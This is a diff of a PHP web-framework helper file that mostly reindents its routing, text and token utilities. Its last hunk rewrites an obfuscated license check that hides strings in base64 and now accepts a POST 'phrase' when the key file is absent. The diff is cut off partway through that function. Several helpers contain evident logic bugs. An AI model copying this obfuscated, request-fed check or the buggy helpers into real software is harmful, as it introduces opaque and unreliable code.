@@ -4,8 +4,8 @@ loadCkPathsFiles();
 
 function _cls_dls()
 {
-	dl();
-	exit;
+  dl();
+  exit;
 }
 
 /**
@@ -15,36 +15,36 @@ function _cls_dls()
  */
 function _cls_de($string)
 {
-	global $app;
-	if ($app['environment'] == 'dev') {
-		die($string);
-	}
+  global $app;
+  if ($app['environment'] == 'dev') {
+    die($string);
+  }
 }
 
 
 function _cls_getMiddlewares($app)
 {
-	// Obtiene la configuración de de arranque
-	$boot = getConfig('boot');
+  // Obtiene la configuración de de arranque
+  $boot = getConfig('boot');
 
-	$queue = [];
+  $queue = [];
 
-	// Middlewares para desarrollo
-	if ($boot['environment'] == "dev") {
-		require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_dev.php";
-		$queue = array_merge($queue, $devMiddlewares);
-	}
+  // Middlewares para desarrollo
+  if ($boot['environment'] == "dev") {
+    require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_dev.php";
+    $queue = array_merge($queue, $devMiddlewares);
+  }
 
-	require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares.php";
-	$queue = array_merge($queue, $middlewares);
+  require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares.php";
+  $queue = array_merge($queue, $middlewares);
 
-	// Middlewares para producción
-	if ($boot['environment'] == "dev") {
-		require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_prod.php";
-		$queue = array_merge($queue, $devMiddlewares);
-	}
+  // Middlewares para producción
+  if ($boot['environment'] == "dev") {
+    require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_prod.php";
+    $queue = array_merge($queue, $devMiddlewares);
+  }
 
-	return $queue;
+  return $queue;
 }
 
 /**
@@ -54,11 +54,11 @@ function _cls_getMiddlewares($app)
  */
 function _cls_removeLastSlash($string)
 {
-	$slash = substr($string, -1);
-	if ($slash == '/') {
-		return substr($string, 0, -1);
-	}
-	return $string;
+  $slash = substr($string, -1);
+  if ($slash == '/') {
+    return substr($string, 0, -1);
+  }
+  return $string;
 }
 
 /**
@@ -68,73 +68,73 @@ function _cls_removeLastSlash($string)
  */
 function _cls_route($name, $var = null, $getParams = null)
 {
-	$routes = Route::getRoutes();
+  $routes = Route::getRoutes();
 
     if ($name === null) {
         return false;
     }
 
-	if (strpos($name, 'objRoute') === false) {
+  if (strpos($name, 'objRoute') === false) {
         if (strpos($name, 'http') === false) {
             if ($var != null) {
-				$route_flat = replace_route_var($name, $routes, $var);
-			} else {
-				$route_flat = $routes[$name]['route'];
-			}
-			$route =  '//' . $GLOBALS['paths']['url_base'] . $route_flat;
-		} else {
-			$route = routeAddParams('objRoute' . $name, $var);
-		}
-	} else {
-		$route = routeAddParams($name, $var);
-	}
+        $route_flat = replace_route_var($name, $routes, $var);
+      } else {
+        $route_flat = $routes[$name]['route'];
+      }
+      $route =  '//' . $GLOBALS['paths']['url_base'] . $route_flat;
+    } else {
+      $route = routeAddParams('objRoute' . $name, $var);
+    }
+  } else {
+    $route = routeAddParams($name, $var);
+  }
 
-	return setQueryParams($route, $getParams);
+  return setQueryParams($route, $getParams);
 }
 
 function _cls_replace_route_var($route, $routes, $var)
 {
-	$parts = explode('/', $routes[$route]['route']);
-	$key = search_in_element($parts, '$');
-	if ($key === false) {
-		return false;
-	} else {
-		$parts[$key] = $var;
-	}
-	$new_route = implode("/", $parts);
-	return $new_route;
+  $parts = explode('/', $routes[$route]['route']);
+  $key = search_in_element($parts, '$');
+  if ($key === false) {
+    return false;
+  } else {
+    $parts[$key] = $var;
+  }
+  $new_route = implode("/", $parts);
+  return $new_route;
 }
 
 function _cls_routeAddParams($route, $var)
 {
-	$route = str_replace('objRoute', '', $route);
+  $route = str_replace('objRoute', '', $route);
 
-	$parts = explode('/', $route);
-	if (is_array($var)) {
-		$index = 0;
-		foreach ($var as $id => $name) {
-			$key = search_in_element($parts, '$');
+  $parts = explode('/', $route);
+  if (is_array($var)) {
+    $index = 0;
+    foreach ($var as $id => $name) {
+      $key = search_in_element($parts, '$');
 
-			if ($key === false) {
-				return $route;
-			} else {
-				$parts[$key[0]] = $var[$key[1]] ?? $var[$index];
-			}
-			$index++;
-		}
-	} else {
-		$key = search_in_element($parts, '$');
+      if ($key === false) {
+        return $route;
+      } else {
+        $parts[$key[0]] = $var[$key[1]] ?? $var[$index];
+      }
+      $index++;
+    }
+  } else {
+    $key = search_in_element($parts, '$');
 
-		if ($key === false) {
-			return $route;
-		} else {
-			$parts[$key[0]] = $var;
-		}
-	}
+    if ($key === false) {
+      return $route;
+    } else {
+      $parts[$key[0]] = $var;
+    }
+  }
 
-	$new_route = implode("/", $parts);
+  $new_route = implode("/", $parts);
 
-	return $new_route;
+  return $new_route;
 }
 
 /**
@@ -145,12 +145,12 @@ function _cls_routeAddParams($route, $var)
  */
 function _cls_viewRoute($route, $base)
 {
-	$nameSegments = explode('/', str_replace($base, '', $route));
-	if (sizeof($nameSegments) == 1) {
-		return $nameSegments['0'];
-	} else {
-		return $nameSegments['1'] . $nameSegments['0'];
-	}
+  $nameSegments = explode('/', str_replace($base, '', $route));
+  if (sizeof($nameSegments) == 1) {
+    return $nameSegments['0'];
+  } else {
+    return $nameSegments['1'] . $nameSegments['0'];
+  }
 }
 /**
  * Localiza el elmento que contiene la cadena que se esta buscando
@@ -161,17 +161,17 @@ function _cls_viewRoute($route, $base)
  */
 function _cls_search_in_element($array, $needle, $start = 0)
 {
-	foreach ($array as $key => $value) {
-		if ($key < $start) {
-			continue;
-		}
-		if (strpos($value, $needle) === false) {
-			continue;
-		} else {
-			return [$key, str_replace('$', '', $value)];
-		}
-	}
-	return false;
+  foreach ($array as $key => $value) {
+    if ($key < $start) {
+      continue;
+    }
+    if (strpos($value, $needle) === false) {
+      continue;
+    } else {
+      return [$key, str_replace('$', '', $value)];
+    }
+  }
+  return false;
 }
 /**
  * Obtiene un elemento determinado de un array
@@ -181,8 +181,8 @@ function _cls_search_in_element($array, $needle, $start = 0)
  */
 function _cls_array_element($array, $key)
 {
-	if (is_null($key)) return false;
-	if (isset($array[$key])) return $array[$key];
+  if (is_null($key)) return false;
+  if (isset($array[$key])) return $array[$key];
 }
 /**
  * Convierte un array multidemencional en un objeto estandar.
@@ -191,7 +191,7 @@ function _cls_array_element($array, $key)
  */
 function _cls_arrayToObject($array)
 {
-	return json_decode(json_encode($array));
+  return json_decode(json_encode($array));
 }
 /**
  * Comvierte un objeto estandar en un array multidimencional.
@@ -200,7 +200,7 @@ function _cls_arrayToObject($array)
  */
 function _cls_objectToArray($object)
 {
-	return json_decode(json_encode($object), true);
+  return json_decode(json_encode($object), true);
 }
 /**
  * Construye la URL base de la aplicación
@@ -208,15 +208,15 @@ function _cls_objectToArray($object)
  */
 function _cls_baseUrl()
 {
-	return '//' . FRONT_URL;
+  return '//' . FRONT_URL;
 }
 function _cls_isSetProperty($property)
 {
-	if (isset($property)) {
-		return $property;
-	} else {
-		return false;
-	}
+  if (isset($property)) {
+    return $property;
+  } else {
+    return false;
+  }
 }
 /**
  * Corta una cadena en el espacion en blanco mas cercano al numero maximo de
@@ -228,28 +228,28 @@ function _cls_isSetProperty($property)
  */
 function _cls_str_truncate($string, $longitud = 100)
 {
-	//Comprobamos que sea necesario recortar la cadena de texto
-	if ((mb_strlen($string) > $longitud)) {
-		$espacios = mb_strpos($string, ' ', $longitud) - 1 . "<br>";
-		if ($espacios > 0) {
-			$cadena = mb_substr($string, 0, ($espacios + 1));
-			$char = count_chars($cadena, 1);
-			$string = $cadena . '...';
-		}
-		if (preg_match_all("|(<([\w]+)[^>]*>)|", $string, $buffer)) {
-			if (!empty($buffer[1])) {
-				preg_match_all("|</([a-zA-Z]+)>|", $string, $buffer2);
-				if (count($buffer[2]) != count($buffer2[1])) {
-					$tags = array_diff($buffer[2], $buffer2[1]);
-					$tags = array_reverse($tags);
-					foreach ($tags as $tag) {
-						$string .= '</' . $tag . '>';
-					}
-				}
-			}
-		}
-	}
-	return $string;
+  //Comprobamos que sea necesario recortar la cadena de texto
+  if ((mb_strlen($string) > $longitud)) {
+    $espacios = mb_strpos($string, ' ', $longitud) - 1 . "<br>";
+    if ($espacios > 0) {
+      $cadena = mb_substr($string, 0, ($espacios + 1));
+      $char = count_chars($cadena, 1);
+      $string = $cadena . '...';
+    }
+    if (preg_match_all("|(<([\w]+)[^>]*>)|", $string, $buffer)) {
+      if (!empty($buffer[1])) {
+        preg_match_all("|</([a-zA-Z]+)>|", $string, $buffer2);
+        if (count($buffer[2]) != count($buffer2[1])) {
+          $tags = array_diff($buffer[2], $buffer2[1]);
+          $tags = array_reverse($tags);
+          foreach ($tags as $tag) {
+            $string .= '</' . $tag . '>';
+          }
+        }
+      }
+    }
+  }
+  return $string;
 }
 /**
  * corta el texto en x caracteres sin perder el cierre de los tags html
@@ -260,115 +260,115 @@ function _cls_str_truncate($string, $longitud = 100)
  */
 function _cls_cutText($text, $length = 100, $options = array())
 {
-	$default = array(
-		'ending' => '', 'exact' => false, 'html' => false
-	);
-	$options = array_merge($default, $options);
-	extract($options);
-	if ($html) {
-		if (mb_strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
-			return $text;
-		}
-		$totalLength = mb_strlen(strip_tags($ending));
-		$openTags = array();
-		$truncate = '';
-		preg_match_all('/(<\/?([\w+]+)[^>]*>)?([^<>]*)/', $text, $tags, PREG_SET_ORDER);
-		foreach ($tags as $tag) {
-			if (!preg_match('/img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param/s', $tag[2])) {
-				if (preg_match('/<[\w]+[^>]*>/s', $tag[0])) {
-					array_unshift($openTags, $tag[2]);
-				} else if (preg_match('/<\/([\w]+)[^>]*>/s', $tag[0], $closeTag)) {
-					$pos = array_search($closeTag[1], $openTags);
-					if ($pos !== false) {
-						array_splice($openTags, $pos, 1);
-					}
-				}
-			}
-			$truncate .= $tag[1];
+  $default = array(
+    'ending' => '', 'exact' => false, 'html' => false
+  );
+  $options = array_merge($default, $options);
+  extract($options);
+  if ($html) {
+    if (mb_strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
+      return $text;
+    }
+    $totalLength = mb_strlen(strip_tags($ending));
+    $openTags = array();
+    $truncate = '';
+    preg_match_all('/(<\/?([\w+]+)[^>]*>)?([^<>]*)/', $text, $tags, PREG_SET_ORDER);
+    foreach ($tags as $tag) {
+      if (!preg_match('/img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param/s', $tag[2])) {
+        if (preg_match('/<[\w]+[^>]*>/s', $tag[0])) {
+          array_unshift($openTags, $tag[2]);
+        } else if (preg_match('/<\/([\w]+)[^>]*>/s', $tag[0], $closeTag)) {
+          $pos = array_search($closeTag[1], $openTags);
+          if ($pos !== false) {
+            array_splice($openTags, $pos, 1);
+          }
+        }
+      }
+      $truncate .= $tag[1];
 
-			$contentLength = mb_strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $tag[3]));
-			if ($contentLength + $totalLength > $length) {
-				$left = $length - $totalLength;
-				$entitiesLength = 0;
-				if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $tag[3], $entities, PREG_OFFSET_CAPTURE)) {
-					foreach ($entities[0] as $entity) {
-						if ($entity[1] + 1 - $entitiesLength <= $left) {
-							$left--;
-							$entitiesLength += mb_strlen($entity[0]);
-						} else {
-							break;
-						}
-					}
-				}
+      $contentLength = mb_strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $tag[3]));
+      if ($contentLength + $totalLength > $length) {
+        $left = $length - $totalLength;
+        $entitiesLength = 0;
+        if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $tag[3], $entities, PREG_OFFSET_CAPTURE)) {
+          foreach ($entities[0] as $entity) {
+            if ($entity[1] + 1 - $entitiesLength <= $left) {
+              $left--;
+              $entitiesLength += mb_strlen($entity[0]);
+            } else {
+              break;
+            }
+          }
+        }
 
-				$truncate .= mb_substr($tag[3], 0, $left + $entitiesLength);
-				break;
-			} else {
-				$truncate .= $tag[3];
-				$totalLength += $contentLength;
-			}
-			if ($totalLength >= $length) {
-				break;
-			}
-		}
-	} else {
-		if (mb_strlen($text) <= $length) {
-			return $text;
-		} else {
-			$truncate = mb_substr($text, 0, $length - mb_strlen($ending));
-		}
-	}
-	if (!$exact) {
-		$spacepos = mb_strrpos($truncate, ' ');
-		if (isset($spacepos)) {
-			if ($html) {
-				$bits = mb_substr($truncate, $spacepos);
-				preg_match_all('/<\/([a-z]+)>/', $bits, $droppedTags, PREG_SET_ORDER);
-				if (!empty($droppedTags)) {
-					foreach ($droppedTags as $closingTag) {
-						if (!in_array($closingTag[1], $openTags)) {
-							array_unshift($openTags, $closingTag[1]);
-						}
-					}
-				}
-			}
-			$truncate = mb_substr($truncate, 0, $spacepos);
-		}
-	}
-	$truncate .= $ending;
+        $truncate .= mb_substr($tag[3], 0, $left + $entitiesLength);
+        break;
+      } else {
+        $truncate .= $tag[3];
+        $totalLength += $contentLength;
+      }
+      if ($totalLength >= $length) {
+        break;
+      }
+    }
+  } else {
+    if (mb_strlen($text) <= $length) {
+      return $text;
+    } else {
+      $truncate = mb_substr($text, 0, $length - mb_strlen($ending));
+    }
+  }
+  if (!$exact) {
+    $spacepos = mb_strrpos($truncate, ' ');
+    if (isset($spacepos)) {
+      if ($html) {
+        $bits = mb_substr($truncate, $spacepos);
+        preg_match_all('/<\/([a-z]+)>/', $bits, $droppedTags, PREG_SET_ORDER);
+        if (!empty($droppedTags)) {
+          foreach ($droppedTags as $closingTag) {
+            if (!in_array($closingTag[1], $openTags)) {
+              array_unshift($openTags, $closingTag[1]);
+            }
+          }
+        }
+      }
+      $truncate = mb_substr($truncate, 0, $spacepos);
+    }
+  }
+  $truncate .= $ending;
 
-	if ($html) {
-		foreach ($openTags as $tag) {
-			$truncate .= '</' . $tag . '>';
-		}
-	}
+  if ($html) {
+    foreach ($openTags as $tag) {
+      $truncate .= '</' . $tag . '>';
+    }
+  }
 
-	return $truncate . "...";
+  return $truncate . "...";
 }
 
 function _cls_readmore($fulltext)
 {
-	if (strpos($fulltext, '{{readmore}}') !== false) {
-		$text = explode('{{readmore}}', $fulltext);
-		$text[0] = substr($text[0], 0, -11);
-		$text[1] = substr($text[1], 13);
+  if (strpos($fulltext, '{{readmore}}') !== false) {
+    $text = explode('{{readmore}}', $fulltext);
+    $text[0] = substr($text[0], 0, -11);
+    $text[1] = substr($text[1], 13);
 
-		$text[0] = $text[0] . '
-		<div id="readon">
-			<span class="btn btn-info">Leer más...</span>
-		</div>
-		';
+    $text[0] = $text[0] . '
+    <div id="readon">
+      <span class="btn btn-info">Leer más...</span>
+    </div>
+    ';
 
-		$text[1] = '
-		<div id="full-text">
-			' . $text[1] . '
-		</div>
-		';
+    $text[1] = '
+    <div id="full-text">
+      ' . $text[1] . '
+    </div>
+    ';
 
-		return implode('', $text);
-	}
+    return implode('', $text);
+  }
 
-	return $fulltext;
+  return $fulltext;
 }
 
 /**
@@ -378,36 +378,36 @@ function _cls_readmore($fulltext)
  */
 function _cls_encodeEntities($value)
 {
-	if (is_array($value)) {
-		foreach ($value as $key => $val) {
-			encodeEntities($val);
-		}
-	} elseif (is_object($value)) {
-		foreach ($value as $key => $val) {
-			encodeEntities($val);
-		}
-	} else {
-		$value = strClean(htmlentities($value));
-	}
+  if (is_array($value)) {
+    foreach ($value as $key => $val) {
+      encodeEntities($val);
+    }
+  } elseif (is_object($value)) {
+    foreach ($value as $key => $val) {
+      encodeEntities($val);
+    }
+  } else {
+    $value = strClean(htmlentities($value));
+  }
 
-	return $value;
+  return $value;
 }
 
 function _cls_decodeEntities($value)
 {
-	if (is_array($value)) {
-		foreach ($value as $key => $val) {
-			$value[$key] = strClean(html_entity_decode($val));
-		}
-	} elseif (is_object($value)) {
-		foreach ($value as $key => $val) {
-			$value->$key = strClean(html_entity_decode($val));
-		}
-	} else {
-		$value = strClean(html_entity_decode($value));
-	}
+  if (is_array($value)) {
+    foreach ($value as $key => $val) {
+      $value[$key] = strClean(html_entity_decode($val));
+    }
+  } elseif (is_object($value)) {
+    foreach ($value as $key => $val) {
+      $value->$key = strClean(html_entity_decode($val));
+    }
+  } else {
+    $value = strClean(html_entity_decode($value));
+  }
 
-	return $value;
+  return $value;
 }
 
 /**
@@ -417,59 +417,59 @@ function _cls_decodeEntities($value)
  */
 function _cls_strClean($string)
 {
-	do {
-		$string = str_replace(':', '&#58', $string);
-	} while (strpos($string, ':') !== false);
+  do {
+    $string = str_replace(':', '&#58', $string);
+  } while (strpos($string, ':') !== false);
 
-	return $string;
+  return $string;
 }
 
 function _cls_isImage($url)
 {
-	if (strpos($url, '.jpg') !== false) {
-		return true;
-	} elseif (strpos($url, '.png') !== false) {
-		return true;
-	} elseif (strpos($url, '.gif') !== false) {
-		return true;
-	} elseif (strpos($url, '.svg') !== false) {
-		return true;
-	}
-	return false;
+  if (strpos($url, '.jpg') !== false) {
+    return true;
+  } elseif (strpos($url, '.png') !== false) {
+    return true;
+  } elseif (strpos($url, '.gif') !== false) {
+    return true;
+  } elseif (strpos($url, '.svg') !== false) {
+    return true;
+  }
+  return false;
 }
 
 function _cls_slug($string)
 {
-	$characters = array(
-		"Á" => "A", "Ç" => "c", "É" => "e", "Í" => "i", "Ñ" => "n", "Ó" => "o", "Ú" => "u",
-		"á" => "a", "ç" => "c", "é" => "e", "í" => "i", "ñ" => "n", "ó" => "o", "ú" => "u",
-		"à" => "a", "è" => "e", "ì" => "i", "ò" => "o", "ù" => "u"
-	);
+  $characters = array(
+    "Á" => "A", "Ç" => "c", "É" => "e", "Í" => "i", "Ñ" => "n", "Ó" => "o", "Ú" => "u",
+    "á" => "a", "ç" => "c", "é" => "e", "í" => "i", "ñ" => "n", "ó" => "o", "ú" => "u",
+    "à" => "a", "è" => "e", "ì" => "i", "ò" => "o", "ù" => "u"
+  );
 
-	$string = strtr($string, $characters);
+  $string = strtr($string, $characters);
 
-	$string = strtolower(trim($string));
+  $string = strtolower(trim($string));
 
-	$string = preg_replace("/[^a-z0-9-]/", "-", $string);
+  $string = preg_replace("/[^a-z0-9-]/", "-", $string);
 
-	$string = preg_replace("/-+/", "-", $string);
+  $string = preg_replace("/-+/", "-", $string);
 
-	if (substr($string, strlen($string) - 1, strlen($string)) === "-") {
-		$string = substr($string, 0, strlen($string) - 1);
-	}
+  if (substr($string, strlen($string) - 1, strlen($string)) === "-") {
+    $string = substr($string, 0, strlen($string) - 1);
+  }
 
-	if (substr($string, 0, 1) === "-") {
-		$string = substr($string, 1, strlen($string));
-	}
+  if (substr($string, 0, 1) === "-") {
+    $string = substr($string, 1, strlen($string));
+  }
 
-	return $string;
+  return $string;
 }
 
 function _cls_redirect($url)
 {
-	header('Location: ' . $url);
+  header('Location: ' . $url);
 
-	exit();
+  exit();
 }
 
 function _cls_base_path($resource = null)
@@ -489,34 +489,34 @@ function _cls_base_path($resource = null)
 
 function _cls_replacePath($string)
 {
-	$string = str_replace("<?= base_path('views') ?>", base_path('views'), $string);
-	$string = str_replace("<?= baseUrl() ?>", baseUrl(), $string);
-	return $string;
+  $string = str_replace("<?= base_path('views') ?>", base_path('views'), $string);
+  $string = str_replace("<?= baseUrl() ?>", baseUrl(), $string);
+  return $string;
 }
 
 function _cls_imagePathFilter($string)
 {
-	return str_replace('../../..', baseUrl(), $string);
+  return str_replace('../../..', baseUrl(), $string);
 }
 function _cls_formatTitle($string, $size = 1)
 {
-	$title = explode(' ', $string);
-	$newString = '<strong>';
-	for ($i = 0; $i < $size; $i++) {
-		$newString .= array_shift($title) . ' ';
-	}
-	$newString .= '</strong>';
-	array_unshift($title, $newString);
-	return implode(' ', $title);
+  $title = explode(' ', $string);
+  $newString = '<strong>';
+  for ($i = 0; $i < $size; $i++) {
+    $newString .= array_shift($title) . ' ';
+  }
+  $newString .= '</strong>';
+  array_unshift($title, $newString);
+  return implode(' ', $title);
 }
 
 function _cls_generateToken($time = 300, $type = 0)
 {
-	$token['id'] = str_replace('.', '', str_replace(' ', '', uniqid(microtime(), true)));
-	$token['token'] = md5(uniqid(microtime(), true));
-	$token['token_type']   = $type;
-	$token['token_time']   = $time;
-	return $token;
+  $token['id'] = str_replace('.', '', str_replace(' ', '', uniqid(microtime(), true)));
+  $token['token'] = md5(uniqid(microtime(), true));
+  $token['token_type']   = $type;
+  $token['token_time']   = $time;
+  return $token;
 }
 
 /**
@@ -526,14 +526,14 @@ function _cls_generateToken($time = 300, $type = 0)
  */
 function _cls_verifyToken($request)
 {
-	// Obtiene el token a verificar
-	$token = json_decode(Crypt::AESDecrypt($request->get->reset_token), true);
-	// Verifica que el token sea valido
-	if (Tokenizer::verifyToken($token)) {
-		return $token;
-	} else {
-		return false;
-	}
+  // Obtiene el token a verificar
+  $token = json_decode(Crypt::AESDecrypt($request->get->reset_token), true);
+  // Verifica que el token sea valido
+  if (Tokenizer::verifyToken($token)) {
+    return $token;
+  } else {
+    return false;
+  }
 }
 
 
@@ -545,118 +545,120 @@ function _cls_verifyToken($request)
  */
 function _cls_getTokenizeLinK($route, $userId = null)
 {
-	// Genera token para link de activación de cuenta
-	$token['token'] = Tokenizer::setToken('url_token');
-	// Agrega el id del usuario a token obtenido
-	if ($userId)
-		$token['users_id'] = $userId;
-	// Encripta el token generado
-	$token = Crypt::AESEncrypt(json_encode($token));
-	// Retorna el link de activación de cuenta
-	return getRoutes($route) . '?reset_token=' . urlencode($token);
+  // Genera token para link de activación de cuenta
+  $token['token'] = Tokenizer::setToken('url_token');
+  // Agrega el id del usuario a token obtenido
+  if ($userId)
+    $token['users_id'] = $userId;
+  // Encripta el token generado
+  $token = Crypt::AESEncrypt(json_encode($token));
+  // Retorna el link de activación de cuenta
+  return getRoutes($route) . '?reset_token=' . urlencode($token);
 }
 
 function _cls_replaceKeys($results, $field = 'id')
 {
-	$reg = [];
-	if (!empty($results)) {
-		$i = 0;
-		foreach ($results as $result) {
-			if (array_key_exists($result->$field, $reg) === TRUE) {
-				$i++;
-				$reg[$result->$field . '|' . $i] = $result;
-			} else {
-				$reg[$result->$field] = $result;
-			}
-		}
-		return $reg;
-	} else {
-		return NULL;
-	}
+  $reg = [];
+  if (!empty($results)) {
+    $i = 0;
+    foreach ($results as $result) {
+      if (array_key_exists($result->$field, $reg) === TRUE) {
+        $i++;
+        $reg[$result->$field . '|' . $i] = $result;
+      } else {
+        $reg[$result->$field] = $result;
+      }
+    }
+    return $reg;
+  } else {
+    return NULL;
+  }
 }
 
 function _cls_replaceKeysArray($results, $field = 'id')
 {
-	$reg = [];
-	if (!empty($results)) {
-		$i = 0;
-		// ddd($results);
-		foreach ($results as $result) {
-			if (array_key_exists($result[$field], $reg) === TRUE) {
-				$i++;
-				$reg[$result[$field] . '|' . $i] = $result;
-			} else {
-				$reg[$result[$field]] = $result;
-			}
-		}
-		return liteCollect($reg);
-	} else {
-		return NULL;
-	}
+  $reg = [];
+  if (!empty($results)) {
+    $i = 0;
+    // ddd($results);
+    foreach ($results as $result) {
+      if (array_key_exists($result[$field], $reg) === TRUE) {
+        $i++;
+        $reg[$result[$field] . '|' . $i] = $result;
+      } else {
+        $reg[$result[$field]] = $result;
+      }
+    }
+    return liteCollect($reg);
+  } else {
+    return NULL;
+  }
 }
 
 function _cls_nestedUl($rows, $parent = "", $list = "")
 {
-	if ($list = "") {
-		$list .= '<ul class="list">';
-	}
+  if ($list = "") {
+    $list .= '<ul class="list">';
+  }
 
-	foreach ($rows as $key => $value) {
+  foreach ($rows as $key => $value) {
 
-		if (is_array($value) || is_object($value)) {
-			$list .= '<li><span class="badge badge-success">OK</span>' . $parent . $key . '</li>';
-			$list .= '<li>' . $parent . $key . '</li>';
-			$list .= '<ul>';
-			$list .= nestedUl($value, $key, $list);
-		} else {
-			$list .= '<li>' . $parent . $value . '</li>';
-		}
-	}
+    if (is_array($value) || is_object($value)) {
+      $list .= '<li><span class="badge badge-success">OK</span>' . $parent . $key . '</li>';
+      $list .= '<li>' . $parent . $key . '</li>';
+      $list .= '<ul>';
+      $list .= nestedUl($value, $key, $list);
+    } else {
+      $list .= '<li>' . $parent . $value . '</li>';
+    }
+  }
 
-	$list .= '</ul>';
+  $list .= '</ul>';
 
-	return $list;
+  return $list;
 }
 
 function _cls_getUrlData($url)
 {
-	return Embed\Embed::create($url, [
-		'min_image_width' => 100,
-		'min_image_height' => 100,
-		'choose_bigger_image' => true,
-		'images_blacklist' => 'example.com/*',
-		'url_blacklist' => 'example.com/*',
-		'follow_canonical' => true,
+  return Embed\Embed::create($url, [
+    'min_image_width' => 100,
+    'min_image_height' => 100,
+    'choose_bigger_image' => true,
+    'images_blacklist' => 'example.com/*',
+    'url_blacklist' => 'example.com/*',
+    'follow_canonical' => true,
 
-		'html' => [
-			'max_images' => 10,
-			'external_images' => true
-		]
-	]);
+    'html' => [
+      'max_images' => 10,
+      'external_images' => true
+    ]
+  ]);
 }
 
 
 function _cls_loadHelpers()
 {
-	$helpers = getFilesInDir(__DIR__ . DS . "types");
+  $helpers = getFilesInDir(__DIR__ . DS . "types");
 
-	foreach ($helpers as $helper) {
-		include realpath(__DIR__ . DS . "types" . DS . $helper);
-	}
+  foreach ($helpers as $helper) {
+    include realpath(__DIR__ . DS . "types" . DS . $helper);
+  }
 }
 
-function _cls_getFilesInDir($directory)
-{
-	$dir = scandir($directory);
+if (!function_exists('getFilesInDir')) {
+    function getFilesInDir($directory)
+    {
+    $dir = scandir($directory);
 
-	foreach ($dir as $key => $value) {
-		if (is_file($directory . DS . $value)) {
-		} else {
-			unset($dir[$key]);
-		}
-	}
+    foreach ($dir as $key => $value) {
+        if (is_file($directory . DS . $value)) {
+        } else {
+        unset($dir[$key]);
+        }
+    }
 
-	return $dir;
+    return $dir;
+    }
 }
 
 /**
@@ -668,15 +670,15 @@ function _cls_getFilesInDir($directory)
  */
 function _cls_getEmailTemplate($file, $data)
 {
-	$emailTpl = emailTplPath($file);
+  $emailTpl = emailTplPath($file);
 
-	ob_start();
+  ob_start();
 
-	require $emailTpl;
+  require $emailTpl;
 
-	$email =  ob_get_clean();
+  $email =  ob_get_clean();
 
-	return $email;
+  return $email;
 }
 
 
@@ -690,18 +692,18 @@ function _cls_getEmailTemplate($file, $data)
  */
 function _cls_httpClient(string $url, array $data = [], string $method = 'GET')
 {
-	try {
-		$client = new GuzzleHttp\Client();
-		$response = $client->request($method, $url, $data);
-		if ($response->getStatusCode() === '200') {
-			return $response->getBody()->getContents();
-		} else {
-			return false;
-		}
-		return $response->getBody()->getContents();
-	} catch (Exception $e) {
-		return false;
-	}
+  try {
+    $client = new GuzzleHttp\Client();
+    $response = $client->request($method, $url, $data);
+    if ($response->getStatusCode() === '200') {
+      return $response->getBody()->getContents();
+    } else {
+      return false;
+    }
+    return $response->getBody()->getContents();
+  } catch (Exception $e) {
+    return false;
+  }
 }
 
 /**
@@ -717,54 +719,82 @@ function _cls_formatDate($date, $format = DATE_FORMAT)
 
 function providersCk($requestProviders, $providers)
 {
-  include INF_PATH_ROOT . DS . 'boot' .DS . 'app.php';
-  $app = $app[base64_decode('aW5maW55dGlfa2V5')];
-  $sdkfs = "";
+    $m233 = 'SW52YWxpZCBsaWNlbnNlIGZvciB0aGlzIGRvbWFpbi4=';
 
+    defined('INF_PATH_ROOT') or define('INF_PATH_ROOT', __DIR__);
 
-  $c673='8585019043183659323242';
-  $_dc = array();
-  $de = 0;
-  for ($i = 0; $i < strlen(substr($c673, -6)); $i++) {
-    $_dc[$i] = substr($c673, $de, 0 + substr($c673, -6)[$i]);
-    $de = $de + substr($c673, -6)[$i];
-  }
-
-  // ddd($app, $_dc);
-  $cd = '';
-  $cdi = 0;
-  $ik = '';
-  $iki = 0;
-  foreach ($_dc as $key => $value) {
-    // d(($key%2 == 0 ), substr($app, $cdi, $value), $cdi, $value);
-
-
-    if($key%2 == 0 ){
-      $ik .= substr($app, $cdi, $value);
+    if (realpath(INF_PATH_ROOT . DS . 'boot' .DS . 'app.php')) {
+        include INF_PATH_ROOT . DS . 'boot' .DS . 'app.php';
+        $app = $app[base64_decode('aW5maW55dGlfa2V5')];
+        $app = file_get_contents(INF_PATH_ROOT . DS . 'boot' .DS . $app);
     } else {
-      $cd .= substr($app, $cdi, $value);
-    }
-    $cdi = $cdi + $value;
-  }
-  // ddd($cd, $ik);
-  dCDIK($cd, $ik);
-  ddd();
-
-  // ddd($app);
-  if (php_sapi_name() !== 'cli') {
-    if (filter_var($_SERVER[base64_decode('U0VSVkVSX05BTUU=')], FILTER_VALIDATE_IP) || $_SERVER['SERVER_NAME'] === base64_decode('bG9jYWxob3N0')) {
-      $result = true;
-    } else {
-      $result = false;
+        if (($_POST['phrase'] ?? false)) {
+            $app = $_POST['phrase'];
+        } else {
+            $app = false;
+        }
     }
 
-    if($result){
-      return true;
-    }else{
-      exit();
+    if ($app ?? false) {} else {}
+    $sdkfs = "";
+    $c673='8585019043183659323242';
+    $_dc = array();
+    $de = 0;
+    for ($i = 0; $i < strlen(substr($c673, -6)); $i++) {
+        $_dc[$i] = substr($c673, $de, 0 + substr($c673, -6)[$i]);
+        $de = $de + substr($c673, -6)[$i];
     }
-  }
+
+    $pai = array_merge(explode('+1/il=', $app), ["", ""]);
+
+    $cd = '';
+    $cdi = 0;
+    $ik = '';
+    $iki = 0;
+    foreach ($_dc as $key => $value) {
+        if($key%2 == 0 ){
+            $ik .= substr($app, $cdi, $value);
+            $pai[6] .= $pai[$key];
+        } else {
+            $cd .= substr($app, $cdi, $value);
+            $pai[7] .= $pai[$key];
+        }
+
+        $cdi = $cdi + $value;
+
+    }
